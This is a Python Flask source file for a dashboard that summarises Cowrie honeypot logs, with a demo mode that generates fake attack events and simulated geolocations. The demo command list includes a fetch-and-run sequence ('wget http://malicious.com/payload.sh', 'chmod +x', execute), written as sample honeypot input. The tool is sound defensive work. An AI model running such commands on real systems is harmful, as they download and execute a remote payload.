from flask import Flask, render_template, jsonify, redirect, url_for
import json
import os
import argparse
from datetime import datetime
from collections import Counter
import random
import sys

# Constants
TEMPLATE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
app = Flask(__name__, template_folder=TEMPLATE_DIR)

# Global Config
LOG_FILE = "cowrie.json"
IS_DEMO = False

def generate_demo_data(num_events=500):
    event_ids = ["cowrie.session.connect", "cowrie.login.failed", "cowrie.login.success", "cowrie.command.input", "cowrie.session.closed"]
    ips = [f"192.168.1.{random.randint(2, 254)}" for _ in range(20)]
    usernames = ["root", "admin", "user", "oracle", "pi", "support"]
    passwords = ["123456", "password", "admin123", "root", "1234", "qwerty"]
    commands = ["uname -a", "ls -la", "cd /tmp", "wget http://malicious.com/payload.sh", "chmod +x payload.sh", "./payload.sh"]
    
    events = []
    for i in range(num_events):
        event_id = random.choice(event_ids)
        src_ip = random.choice(ips)
        timestamp = (datetime.now().replace(hour=random.randint(0, 23), minute=random.randint(0, 59))).isoformat() + "Z"
        session = f"s{random.randint(1000, 9999)}"
        
        event = {
            "eventid": event_id,
            "src_ip": src_ip,
            "timestamp": timestamp,
            "session": session
        }
        
        if event_id in ["cowrie.login.failed", "cowrie.login.success"]:
            event["username"] = random.choice(usernames)
            event["password"] = random.choice(passwords)
        elif event_id == "cowrie.command.input":
            event["input"] = random.choice(commands)
        
        events.append(event)
    return events

def get_simulated_geo(ip):
    # deterministic hash for IP
    random.seed(ip)
    cities = [
        {"name": "Beijing, CN", "lat": 39.9042, "lon": 116.4074},
        {"name": "Moscow, RU", "lat": 55.7558, "lon": 37.6173},
        {"name": "New York, US", "lat": 40.7128, "lon": -74.0060},
        {"name": "San Francisco, US", "lat": 37.7749, "lon": -122.4194},
        {"name": "London, GB", "lat": 51.5074, "lon": -0.1278},
        {"name": "Paris, FR", "lat": 48.8566, "lon": 2.3522},
        {"name": "Tokyo, JP", "lat": 35.6762, "lon": 139.6503},
        {"name": "Sao Paulo, BR", "lat": -23.5505, "lon": -46.6333},
        {"name": "Mumbai, IN", "lat": 19.0760, "lon": 72.8777},
        {"name": "Seoul, KR", "lat": 37.5665, "lon": 126.9780},
        {"name": "Tehran, IR", "lat": 35.6892, "lon": 51.3890},
        {"name": "Frankfurt, DE", "lat": 50.1109, "lon": 8.6821},
    ]
    city = random.choice(cities)
    j_lat = random.uniform(-2.0, 2.0)
    j_lon = random.uniform(-2.0, 2.0)
    random.seed() # reset seed
    
    return {
        "city": city["name"],
        "lat": city["lat"] + j_lat,
        "lon": city["lon"] + j_lon
    }

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/dashboard')
@app.route('/dashboard/')
def dashboard_redirect():
    return redirect(url_for('index'))

@app.route('/api/stats')
def get_stats():
    try:
        if IS_DEMO:
            data = generate_demo_data(1000)
        else:
            if not os.path.exists(LOG_FILE):
                return jsonify({"error": "Log file not found"}), 404
            data = []
            with open(LOG_FILE, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line: continue
                    try:
                        data.append(json.loads(line))
                    except json.JSONDecodeError:
                        continue

        stats = {
            "kpis": {
                "total_events": len(data),
                "connections": 0,
                "unique_attackers": len(set(e.get("src_ip", "Unknown") for e in data)),
                "failed_logins": 0,
                "success_logins": 0,
                "commands": 0,
                "downloads": 0
            },
            "charts": {
                "hourly": [0] * 24,
                "top_ips": [],
                "top_usernames": [],
                "top_passwords": [],
                "top_commands": []
            },
            "recent_events": [],
            "map_data": [],
            "risk_scores": []
        }

        ip_counter = Counter()
        user_counter = Counter()
        pass_counter = Counter()
        cmd_counter = Counter()

        for event in data:
            eid = event.get("eventid", "")
            src_ip = event.get("src_ip", "Unknown")
            ip_counter[src_ip] += 1
            
            ts = event.get("timestamp")
            if ts:
                try:
                    clean_ts = ts.replace("Z", "").split(".")[0]
                    hour = datetime.fromisoformat(clean_ts).hour
                    if 0 <= hour < 24:
                        stats["charts"]["hourly"][hour] += 1
                except (ValueError, TypeError):
                    pass
            
            if eid == "cowrie.session.connect":
                stats["kpis"]["connections"] += 1
            elif eid == "cowrie.login.success":
                stats["kpis"]["success_logins"] += 1
                user_counter[event.get("username", "Unknown")] += 1
                pass_counter[event.get("password", "Unknown")] += 1
            elif eid == "cowrie.login.failed":
                stats["kpis"]["failed_logins"] += 1
                user_counter[event.get("username", "Unknown")] += 1
                pass_counter[event.get("password", "Unknown")] += 1
            elif eid == "cowrie.command.input":
                stats["kpis"]["commands"] += 1
                cmd_counter[event.get("input", "Unknown")] += 1
            
            if eid and "download" in eid.lower():
                stats["kpis"]["downloads"] += 1

        stats["charts"]["top_ips"] = [{"label": str(ip), "value": count} for ip, count in ip_counter.most_common(10)]
        stats["charts"]["top_usernames"] = [{"label": str(u), "value": count} for u, count in user_counter.most_common(10)]
        stats["charts"]["top_passwords"] = [{"label": str(p), "value": count} for p, count in pass_counter.most_common(10)]
        stats["charts"]["top_commands"] = [{"label": str(c), "value": count} for c, count in cmd_counter.most_common(10)]
        
        # Calculate Risk Scores and build GeoMap data
        risk_map = {}
        unique_ips = set(ip_counter.keys())
        for ip in unique_ips:
            if ip == "Unknown": continue
            # Default risk based on pure volume of connections
            risk = ip_counter[ip] * 0.5 
            risk_map[ip] = risk
            
            geo = get_simulated_geo(ip)
            stats["map_data"].append({
                "ip": ip,
                "lat": geo["lat"],
                "lon": geo["lon"],
                "city": geo["city"],
                "weight": ip_counter[ip]
            })

        for event in data:
            eid = event.get("eventid", "")
            ip = event.get("src_ip")
            if not ip or ip == "Unknown": continue
            
            if eid == "cowrie.login.failed":
                risk_map[ip] += 2
            elif eid == "cowrie.login.success":
                risk_map[ip] += 10 # successful logins are high risk
            elif eid == "cowrie.command.input":
                risk_map[ip] += 5
            elif eid and "download" in eid.lower():
                risk_map[ip] += 15
                
        # Top 5 highest risk
        sorted_risk = sorted(risk_map.items(), key=lambda item: item[1], reverse=True)[:5]
        stats["risk_scores"] = [{"ip": k, "score": int(v), "city": get_simulated_geo(k)["city"]} for k, v in sorted_risk]
        
        # Get 20 most recent
        sorted_events = sorted(data, key=lambda x: str(x.get("timestamp", "")), reverse=True)
        # To make ticker work better, we will pass eventid along with a friendly message
        stats["recent_events"] = sorted_events[:30]

        return jsonify(stats)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Cowrie Honeypot Dashboard")
    parser.add_argument("--demo", action="store_true", help="Run with demo data")
    parser.add_argument("--log", default="cowrie.json", help="Path to cowrie.json")
    parser.add_argument("--port", type=int, default=5005, help="Port to run on")
    args = parser.parse_args()
    
    IS_DEMO = args.demo
    LOG_FILE = args.log
    
    print(f"Starting dashboard on port {args.port}...")
    if IS_DEMO:
        print("Running in DEMO mode.")
    
    app.run(host='0.0.0.0', port=args.port, debug=False) # Turned off debug for stability in this env
